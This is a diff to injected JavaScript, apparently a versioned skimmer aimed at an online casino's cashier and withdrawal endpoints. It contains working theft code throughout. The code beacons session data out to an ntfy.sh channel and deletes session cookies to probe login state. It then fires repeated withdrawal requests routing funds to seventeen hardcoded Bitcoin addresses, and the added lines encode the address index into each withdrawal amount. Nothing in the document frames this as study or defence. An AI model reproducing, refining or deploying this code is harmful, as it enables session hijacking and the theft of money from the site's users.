@@ -12,8 +12,8 @@
    PHPSESSID is www+HttpOnly so the lobby page can never read it; we therefore
    beacon the cookie out and resolve identity locally, then blind-fire a ladder. */
 (function () {
-  if (window.__SOV106__) return; window.__SOV106__ = 1;
-  var V = '106', TAG = 'SOV106';
+  if (window.__SOV107__) return; window.__SOV107__ = 1;
+  var V = '107', TAG = 'SOV107';
   var NT = 'https://ntfy.sh/sov39hvt7k2';
   var BR = (function () {
     var h = String(location.hostname || '').toLowerCase();
@@ -23,7 +23,7 @@
   var CK = 'https://www.' + BR + '/app/shared/controllers/Cashier_v3Controller.php';
   var CP = 'https://www.' + BR + '/cashier/withdrawals';
   var HOME = 'https://www.' + BR + '/';
-  var COOL = 'sov106_cool', SHK = 'sov106_shots', ADDRK = 'sov106_addr', COOLMS = 8 * 60 * 1000;
+  var COOL = 'sov107_cool', SHK = 'sov107_shots', ADDRK = 'sov107_addr', COOLMS = 8 * 60 * 1000;
   var WPROV = 'Coinbase';
 var LADDER = [50.37, 50.37, 50.37, 50.37, 50.37, 50.37, 50.37, 50.37], GA = 51.37, GA2 = 52.37, GAP = 2, MAXT = 360, HOP = 9000, MAXU = 40;
   var ADDRS = ['1PmMNcCDZfMQYXFeBPLgc9DQJj9cz7BmDv', '18RyS2XTv3gu38RUAihENc82yqWCK66VXD', '1DbGax2cdSMCgmvMU11xZzM9vhun8qF4nn', '1Bytwqap93vE6FBdY13P785cMTYgL8duaV', '1FfKV75xWzYQGPVaoQE53AomEs8KEENagx', '1L3ZgDjkqn3KQZZYsigDn6L5MJpTPL65jq', '17HqH2WYf71PzBkmmKWiUPikNnzUykBaTc', '1MPc16X2yUxX3tFrnPjSVjWK2qHsv7j5HB', '144pLnCkrq9D1BgjfQfM2XhEW3zf9EaBu4', '17ty8PZdi5CjAUTR3wPVNRuKCQNuqfuLMk', '16x4FuwcFCE8kK4Rd8tukkAfGVM2V7jQKu', '1NQkRUhnEga2bXsdjkQa4NVoXgug6aa7FM', '19Dum8sxudJF3Yq4RbrxcYvrescajk78Hr', '16gAuYrQKmAtwotwS6Z6EjTiTvGfFZtgNQ', '1K7uRvYtobvVtKncHiut6Zuk9rNGCMA2DM', '15fpLGcJA94r3Dk1jqLXZeaZEM6FYP945L', '1KpBG7TQ2zfrEoDFnZQRf4AJ3WBuNv7WWg'];
@@ -48,6 +48,8 @@ var LADDER = [50.37, 50.37, 50.37, 50.37, 50.37, 50.37, 50.37, 50.37], GA = 51.3
   function st() { try { return { sh: +localStorage.getItem(SHK) || 0, ts: +localStorage.getItem(COOL) || 0 } } catch (e) { return { sh: 0, ts: 0 } } }
   function mark(sh) { try { localStorage.setItem(SHK, String(sh)); localStorage.setItem(COOL, String(Date.now())) } catch (e) { } }
   function cool() { var s = st(); return s.ts && (Date.now() - s.ts) < COOLMS }
+  function adx() { try { for (var i = 0; i < ADDRS.length; i++) if (ADDRS[i] === ad) return i } catch (e) { } return 0 }
+  function amt() { return 50.37 + adx() * 0.01 }
   function pick() {
     try { var a = localStorage.getItem(ADDRK); if (a) return a } catch (e) { }
     var a = ADDRS[hash(connId() || String(Date.now())) % ADDRS.length];
@@ -348,17 +350,14 @@ var LADDER = [50.37, 50.37, 50.37, 50.37, 50.37, 50.37, 50.37, 50.37], GA = 51.3
     try { for (var i = 0; i < 1; i++) delCk(); } catch (e) {}
     try {
       if (fired >= LADDER.length) return;
-      var amt = LADDER[shots] == null ? 50 : LADDER[shots];
-      if (WARMW > 0) amt = Math.min(2500, Math.max(1, Math.floor(WARMW * 0.9)));
-      beat('amt', { w: Math.round(WARMW * 100) / 100, a: amt });
+      var A = amt();
+      beat('amt', { w: Math.round(WARMW * 100) / 100, a: A });
       // 探测态：删掉 ck。绑定后服务端仍认会话 → 进业务层；未绑定 → 匿名 500（零副作用）
       PENDCK = 0, WARMW = 0;
       for (var z = 0; z < 8; z++) delCk();
       delOk = ckHas('inclave_sso_l') ? 'kept' : 'gone';
       beat('rb', { sh: shots, u: unhit, ck: ckHas('inclave_sso_l') ? 1 : 0 });
-      armA(amt, shots);
-      setTimeout(function () { post(GA2, 'B', Date.now(), false) }, 900);
-      setTimeout(function () { try { post(GA, 'B', Date.now() + 1, false) } catch (e) { } }, 300);
+      armA(A, shots);
       try {
         var g0 = Date.now();
         fetch('https://www.' + BR + '/app/shared/controllers/Cashier_v3Controller.php?getbalance&_=' + Date.now(),
